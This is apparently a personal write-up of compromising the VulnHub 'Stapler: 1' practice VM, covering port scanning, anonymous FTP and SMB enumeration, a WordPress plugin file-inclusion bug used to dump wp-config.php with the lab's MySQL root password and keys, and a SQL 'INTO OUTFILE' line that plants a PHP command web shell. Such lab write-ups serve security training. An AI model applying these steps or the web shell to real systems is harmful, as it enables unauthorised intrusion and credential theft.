# Stapler: 1

https://www.vulnhub.com/entry/stapler-1,150/

Recommended on the list of [OSCP-like VMs here](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms).

## Recon

An all port scan returned:

```
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
```

So: ftp, ssh, 'domain' (dns), http, a samba share, mysql and two custom ports(?) 666 and 12380

## DOOM nc

I used nc to read port 666, which returned a byte stream. Using `nc 192.168.1.76 666 > out.bin` I got the content, then used `binwalk out.bin` to find it was a zip file. Unzipping returned `message2.jpg`. The image was of a series of shell commands, copied here as:

```
~$ echo Hello World.
Hello World.
~$ 
~$ echo Scott, please change this message
segmentation fault
```

Perhaps an indication of a binary somewhere which an overflow error?

## FTP Anonymous

Connecting shows this banner:

```
220-
220-|-----------------------------------------------------------------------------------------|                                                                                                   
220-| Harry, make sure to update the banner when you get a chance to show who has access here |                                                                                                   
220-|-----------------------------------------------------------------------------------------|                                                                                                   
220-                                                                                                                                                                                              
220
```

I can log in as anonymous, and find a single file: `note` The contents of `note` are:

```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

## HTTP

The website is blank page showing that `The requested resource <code class="url">/</code> was not found on this server.`. 

A nikto and dirb reveal .profile, and .bashrc are present, showing this is surfacing a home folder. A search for other files, and path traversal, don't find anything, but this might be a candidate for something in future.

I tried posting content into it, but that failed.

## SMB

This blog was useful for SMB shenanigans: [smb-enumeration-for-penetration-testin](https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b)

I ran the following to get a list of files on the share:

```
kali@kali:~$ smbmap -H 192.168.1.74 -P 139 -R
[+] Finding open SMB ports....
[+] Guest RPC session established on 192.168.1.74...
[+] IP: 192.168.1.74:139        Name: 192.168.1.74                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        .                                                  
        dr--r--r--                0 Fri Jun  3 12:52:52 2016    .
        dr--r--r--                0 Mon Jun  6 17:39:56 2016    ..
        dr--r--r--                0 Sun Jun  5 11:02:27 2016    kathy_stuff
        dr--r--r--                0 Sun Jun  5 11:04:14 2016    backup
        kathy                                                   READ ONLY       Fred, What are we doing here?
        .\
        dr--r--r--                0 Fri Jun  3 12:52:52 2016    .
        dr--r--r--                0 Mon Jun  6 17:39:56 2016    ..
        dr--r--r--                0 Sun Jun  5 11:02:27 2016    kathy_stuff
        dr--r--r--                0 Sun Jun  5 11:04:14 2016    backup
        .\kathy_stuff\
        dr--r--r--                0 Sun Jun  5 11:02:27 2016    .
        dr--r--r--                0 Fri Jun  3 12:52:52 2016    ..
        -r--r--r--               64 Sun Jun  5 11:02:27 2016    todo-list.txt
        .\backup\
        dr--r--r--                0 Sun Jun  5 11:04:14 2016    .
        dr--r--r--                0 Fri Jun  3 12:52:52 2016    ..
        -r--r--r--             5961 Sun Jun  5 11:03:45 2016    vsftpd.conf
        -r--r--r--          6321767 Mon Apr 27 13:14:45 2015    wordpress-4.tar.gz
        tmp                                                     READ, WRITE     All temporary files should be stored here
        .\
        dr--r--r--                0 Thu Mar 26 19:28:20 2020    .
        dr--r--r--                0 Mon Jun  6 17:39:56 2016    ..
        -r--r--r--              274 Sun Jun  5 11:32:58 2016    ls
        IPC$                                                    NO ACCESS       IPC Service (red server (Samba, Ubuntu))
```

Connecting with `smbclient \\\\192.168.1.74\\kathy` I was able to download the three files under `kathy_stuff` and `backup`.

The content of `todo-list.txt` was `I'm making sure to backup anything important for Initech, Kathy`.

The vsftp file seemed pretty standard. The wordpress archive suggests to me their might be a wordpress site somewhere.

The ls file under tmp looks to be a txt file (I can also run it, with odd results). It returns the following content from a cat:

```
.:
total 12.0K
drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
-rw-r--r--  1 root root    0 Jun  5 16:32 ls
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
```

Which does look like the possible content of the actual tmp dir on the machine. Importantly, I discover I can actually upload files into this tmp dir. Hmm.

## Port 12380

I had taken a look at this earlier with nc, but hadn't gotten far. I *should* have guessed it was a http/https port - I tested this now, given the wordpress archive. Sure enough, `http://192.168.1.74:12380` shows a holding page, with nothing interesting except an uncommon response header `dave: something doesn't look quite right here`. 

A nikto scan suggests the site has a ssl configured, and when I browse to `https://192.168.1.74:12380` I get something different: a blank page with the text `Internal Index Page!`

The robots.txt file contained two entries: `admin112233` and `blogblog`. The first took me to a xss page, that posts a warning message about beef hooks (a way to use xss to exploit user browser sessions via a tool called BEEF) before redirecting to xss-payloads.com. Accessing the site wiothout javascript (or via burp) reveals nothing except a congratulations for not falling to a script attack.

Browsing to /blogblog/ reveals a word press site, with nothing of obvious on it.

## WordPress and plugins

Browsing through the site I found a post indicating that said `The only thing really which Vicki managed to sort out was to a few WordPress plugins for us. Please be sure to check out their new features!`

I did a wordpress scan against the site, with aggresive searching for plugins, and found several (these were also listed under the listable `wp-content/plugins` directory). The first that I checked, `advanced-video-embed-embed-videos-or-playlists`, had a [public exploit-db entry](https://www.exploit-db.com/exploits/39646) for local file inclusion.

Using this I created a post whose jpeg thumbnail was actually the wp-config.php file, which I grabbed via `wget` and catted to reveal the root credentials of mysql on the box:

```
kali@kali:~$ cat 152396061.jpeg 
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
```

## MySQL

I could use the above to log into phpmyadmin, discovered when I did a dirb before. This gave me access to the system where I could, for example, change the password of the wordpress admin user to `hacktheplanet`. 

I could also use the SQL command window to upload a php shell to /tmp: `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/tmp/cmd.php"`, which I then checked via the smbclient from before to confirm that yes, /tmp is being shared. Given I could have also uploaded the shell over smb this doesnt give me much however. I would need to find a location where PHP is being served from...
